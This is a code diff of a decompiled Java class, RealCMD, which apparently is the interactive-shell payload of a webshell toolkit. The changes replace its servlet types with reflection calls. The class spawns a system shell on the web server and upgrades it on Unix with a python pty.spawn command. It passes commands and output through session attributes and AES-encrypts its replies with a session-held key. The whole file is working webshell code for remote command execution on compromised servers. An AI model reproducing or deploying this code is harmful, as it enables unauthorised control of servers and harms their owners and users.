@@ -7,92 +7,94 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
+import java.lang.reflect.Method;
 import java.nio.charset.Charset;
 import java.util.Arrays;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class RealCMD implements Runnable {
    public static String bashPath;
    public static String type;
    public static String cmd;
    public static String whatever;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
    public boolean equals(Object obj) {
       HashMap result = new HashMap();
-      boolean var11 = false;
+      boolean var13 = false;
 
-      ServletOutputStream so = null;
+      Object so;
+      Method write;
       label101: {
          try {
-            var11 = true;
+            var13 = true;
             this.fillContext(obj);
             result.put("msg", this.runCmd());
             result.put("status", "success");
-            var11 = false;
+            var13 = false;
             break label101;
-         } catch (Exception var15) {
+         } catch (Exception var17) {
             result.put("status", "fail");
-            result.put("msg", var15.getMessage());
-            var11 = false;
+            result.put("msg", var17.getMessage());
+            var13 = false;
          } finally {
-            if (var11) {
+            if (var13) {
                try {
-                  so = this.Response.getOutputStream();
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
                   if (result.get("msg") == null) {
                      result.put("msg", "");
                   }
 
-                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.flush();
-                  so.close();
-               } catch (Exception var12) {
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
+               } catch (Exception var14) {
                }
 
             }
          }
 
          try {
-            so = this.Response.getOutputStream();
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
             if (result.get("msg") == null) {
                result.put("msg", "");
             }
 
-            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.flush();
-            so.close();
-         } catch (Exception var13) {
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var15) {
          }
 
          return true;
       }
 
       try {
-         so = this.Response.getOutputStream();
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
          if (result.get("msg") == null) {
             result.put("msg", "");
          }
 
-         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-      } catch (Exception var14) {
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var16) {
       }
 
       return true;
    }
 
-   public RealCMD(HttpSession session) {
+   public RealCMD(Object session) {
       this.Session = session;
    }
 
@@ -102,19 +104,19 @@ public class RealCMD implements Runnable {
    public String runCmd() throws Exception {
       String result = "";
       if (type.equals("create")) {
-         this.Session.setAttribute("working", true);
+         this.sessionSetAttribute(this.Session, "working", true);
          (new Thread(new RealCMD(this.Session))).start();
       } else if (type.equals("read")) {
-         StringBuilder output = (StringBuilder)this.Session.getAttribute("output");
+         StringBuilder output = (StringBuilder)this.sessionGetAttribute(this.Session, "output");
          result = output.toString();
          output.setLength(0);
       } else if (type.equals("write")) {
          String input = new String(this.base64decode(cmd));
-         BufferedWriter writer = (BufferedWriter)this.Session.getAttribute("writer");
+         BufferedWriter writer = (BufferedWriter)this.sessionGetAttribute(this.Session, "writer");
          writer.write(input);
          writer.flush();
       } else if (type.equals("stop")) {
-         Process process = (Process)this.Session.getAttribute("process");
+         Process process = (Process)this.sessionGetAttribute(this.Session, "process");
          process.destroy();
       }
 
@@ -150,10 +152,10 @@ public class RealCMD implements Runnable {
          InputStream stdout = process.getInputStream();
          BufferedReader reader = new BufferedReader(new InputStreamReader(stdout, osCharset));
          BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
-         this.Session.setAttribute("reader", reader);
-         this.Session.setAttribute("writer", writer);
-         this.Session.setAttribute("output", output);
-         this.Session.setAttribute("process", process);
+         this.sessionSetAttribute(this.Session, "reader", reader);
+         this.sessionSetAttribute(this.Session, "writer", writer);
+         this.sessionSetAttribute(this.Session, "output", output);
+         this.sessionSetAttribute(this.Session, "process", process);
          if (os.indexOf("windows") < 0) {
             String spawn = String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath);
             writer.write(spawn + "\n");
@@ -237,7 +239,7 @@ public class RealCMD implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -248,16 +250,54 @@ public class RealCMD implements Runnable {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
-         this.Session = (HttpSession)objMap.get("session");
-         this.Response = (ServletResponse)objMap.get("response");
-         this.Request = (ServletRequest)objMap.get("request");
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
       }
 
-      this.Response.setCharacterEncoding("UTF-8");
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
+   }
+
+   private Enumeration sessionGetAttributeNames(Object session) {
+      Enumeration result = null;
+
+      try {
+         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+      } catch (Exception var4) {
+      }
+
+      return result;
+   }
+
+   private void sessionRemoveAttribute(Object session, String key) {
+      try {
+         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+      } catch (Exception var4) {
+      }
+
    }
 }
